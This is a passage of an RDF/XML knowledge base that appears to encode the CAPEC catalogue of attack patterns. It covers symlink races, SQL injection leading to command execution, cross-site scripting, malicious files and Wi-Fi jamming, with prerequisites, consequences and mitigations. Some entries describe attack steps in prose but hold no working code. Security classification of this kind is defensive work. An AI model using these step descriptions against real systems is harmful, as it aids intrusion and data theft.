          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify Target) Attacker identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.TECHNIQUE:The attacker writes to files in different directories to check whether the application has sufficient checking before file operations.:TECHNIQUE:The attacker creates symlinks to files in different directories.::STEP:2:PHASE:Experiment:DESCRIPTION:(Try to create symlinks to different files) The attacker then uses a variety of techniques  such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.TECHNIQUE:The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack  or make the application perform expansive tasks (large files parsing  etc.) depending on the purpose of the application.:TECHNIQUE:The attacker may need a little guesswork on the filenames on which the target application would operate.:TECHNIQUE:The attacker tries to create symlinks to the various filenames.::STEP:3:PHASE:Exploit:DESCRIPTION:(Target application operates on created symlinks to sensitive files) The attacker is able to create symlinks to sensitive files while the target application is operating on the file.TECHNIQUE:Create the symlink to the sensitive file such as configuration files  etc.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Certification Authorities need to stop using the weak collision prone MD5 hashing algorithm to hash the certificates that they are about to sign. Instead they should be using stronger hashing functions such as SHA-256 or SHA-512.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack89">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#459">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:473::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Creating a Rogue Certification Authority Certificate"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::327::295::290::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker58">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#192"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack58"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::326::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to a binary executable.::The ability to observe and interact with a communication channel between communicating processes.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Knowlegde of the Open Systems Interconnection model (OSI model)  and famililarity with Wireshark or some other packet analyzer.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Depending on the type of analysis  a variety of tools might be required  such as static code and/or dynamic analysis tools. Alternatively  the effort might require debugging programs such as ollydbg  SoftICE  or disassemblers like IDA Pro. In some instances  packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly  specific protocol analysis might require tools such as PDB (Protocol Debug)  or packet injection tools like pcap or Nemesis.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker219">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#73">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:592::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#User-Controlled Filename"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack219">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#73"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::20::184::96::348::116::350::86::697::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:AvailabilityTECHNICAL IMPACT:Alter Execution Logic::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::20::184::96::348::116::350::86::697::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim must trust the name and locale of user controlled filenames.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To achieve a redirection and use of less trusted source  an attacker can simply edit data that the host uses to build the filename:LEVEL:Low::SKILL:Deploying a malicious look-a-like site (such as a site masquerading as a bank or online auction site) that the user enters their authentication data into.:LEVEL:Medium::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser&apos;s executable process.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker57">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#580"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack57"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have logical access to the target network and system.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary needs to know basic linux commands.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Countermeasures have been proposed for both disassociation flooding and RF jamming  however these countermeasures are not standardized and would need to be supported on both the retransmission device and the handset in order to be effective. Commercial products are not currently available that support jamming countermeasures for Wi-Fi.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack398">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#604">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:601::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Wi-Fi Jamming"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other A successful attack will deny the availability of the Wi-fi network to authorized users.::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption The attacker&apos;s goal is to prevent users from accessing the wireless network. Denying connectivity to the wireless network prevents the user from being able to transmit or receive any data  which also prevents VOIP calls  however this attack poses no threat to data confidentiality.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::To mitigate this type of an attack  an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn&apos;t blocked.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack142">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#490">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:125::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Amplification"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker59">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#191"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack59"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::798::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to a binary or executable such that it can be analyzed by various utilities.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Binary analysis programs such as &apos;strings&apos; or &apos;grep&apos;  or hex editors.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::An organization should provide regular  robust cybersecurity training to its employees to prevent successful social engineering attacks.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack99">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#416">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Manipulate Human Behavior"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Confidentiality Integrity Availability Other Attack patterns that manipulate human behavior can result in a wide variety of consequences and potentially affect the confidentiality  availability  and/or integrity of an application or system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack67"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Encrypt all sensitive communications using properly-configured cryptography.::Design the communication system such that it associates proper authentication/authorization with each channel/message.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack129">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#216">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Communication Channel Manipulation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Other:NOTE:Integrity Read Data Modify Data Other The adversary&apos;s injection of additional content into a communication channel negatively impacts the integrity of that channel.::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful Communication Channel Manipulation attack can result in sensitive information exposure to the adversary  thereby compromising the communication channel&apos;s confidentiality.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker347">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#391"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack347"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker214">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#35">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:636::NATURE:PeerOf:CAPEC ID:23::NATURE:PeerOf:CAPEC ID:75::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Leverage Executable Code in Non-Executable Files"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack214">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#35"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::94::96::95::97::272::59::282::275::264::270::714::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::94::96::95::97::272::59::282::275::264::270::714::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must have the ability to modify non-executable files consumed by the target software.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory  program  or interface. Optionally  ability to capture output directly through synchronous communication or other method such as FTP.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker479">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#84"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack479"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::74::713::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The XQL must execute unvalidated data::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Basic understanding of XQuery:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker346">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#108">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:66::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Command Line Execution through SQL Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack346">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#108"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::89::74::20::78::114::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Probe for SQL Injection vulnerability) The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.::STEP:2:PHASE:Exploit:DESCRIPTION:(Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive) The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.::STEP:3:PHASE:Exploit:DESCRIPTION:(Inject malicious data in the database) Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument::STEP:4:PHASE:Exploit:DESCRIPTION:(Trigger command line execution with injected arguments) The attacker causes execution of command line functionality which leverages previously injected database content as arguments.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::89::74::20::78::114::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application does not properly validate data before storing in the database::Backend application implicitly trusts the data stored in the database::Malicious data is used on the backend as a command line argument::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker most likely has to be familiar with the internal functionality of the system to launch this attack. Without that knowledge  there are not many feedback mechanisms to give an attacker the indication of how to perform command injection or whether the attack is succeeding.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker213">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#17">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:1::NATURE:ChildOf:CAPEC ID:233::NATURE:ChildOf:CAPEC ID:165::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Using Malicious Files"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack213">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#17"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::732::285::272::59::282::275::264::270::693::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::732::285::272::59::282::275::264::270::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::System&apos;s configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory  program  or interface. Optionally  ability to capture output directly through synchronous communication or other method such as FTP.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker345">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#400"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack345"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker478">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#85"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack478"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::79::113::348::96::20::116::184::86::712::692::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The user must allow JavaScript to execute in their browser::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To land and launch a script on victim&apos;s machine with appropriate footprinting logic for enumerating services and vulnerabilities in JavaScript:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker212">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#19">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:242::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Embedding Scripts within Scripts"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack212">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#19"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Spider) Using a browser or an automated tool  an attacker records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head  body  comments)  in an HTML tag  XML  CSS  etc.TECHNIQUE:Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms  URL  fragments  etc.) actively used by the Web application.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Probe identified potential entry points for XSS vulnerability) The attacker uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use a proxy tool to record results of the created requests.::STEP:3:PHASE:Exploit:DESCRIPTION:(Steal session IDs  credentials  page content  etc.) As the attacker succeeds in exploiting the vulnerability  he can choose to steal user&apos;s credentials in order to reuse or to analyze them later on.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and sends document information to the attacker.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:(Forceful browsing) When the attacker targets the current application or another one (through CSRF vulnerabilities)  the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws  but it can also be used to create a widespread attack against a particular website on the user&apos;s current network (Internet or not).TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker&apos;s server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:(Content spoofing) By manipulating the content  the attacker targets the information that the user would like to get from the website.TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim&apos;s browser and exposes attacker-modified invalid information to the user on the current web page.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::284::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target software must be able to execute scripts  and also grant the adversary privilege to write/upload scripts.::"/>
    </j.0:precondition>
    <j.0:need>
